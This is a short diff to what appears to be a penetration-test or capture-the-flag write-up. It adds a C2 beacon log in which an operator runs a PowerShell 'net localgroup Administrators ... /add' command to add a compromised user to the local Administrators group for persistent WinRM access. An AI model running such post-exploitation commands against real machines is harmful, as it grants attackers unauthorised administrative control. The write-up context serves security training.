@@ -1302,5 +1302,19 @@ Domain Admin!
 Although this connection is not persistent and it dies quickly, a work around could be
 
 ```python
+[30/07 22:09:01] operator [3678c670] beacon > powershell net localgroup Administrators l.turner /add
+[30/07 22:09:01] [*] Task: create new process
+[30/07 22:09:03] [*] Agent called server, sent [126 bytes]
+[30/07 22:09:03] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c net localgroup Administrators l.turner /add started with PID 4668 (output - with output)
+[30/07 22:09:07] [+] Job [3678c670] output:
+The command completed successfully.
+[30/07 22:09:07] [+] Job [3678c670] finished
+
++--- Task [3678c670] closed ----------------------------------------------------------+
+```
+
+Add a user we have WINRM access with via credentials to the Administrators group
+
+```python
 
 ```
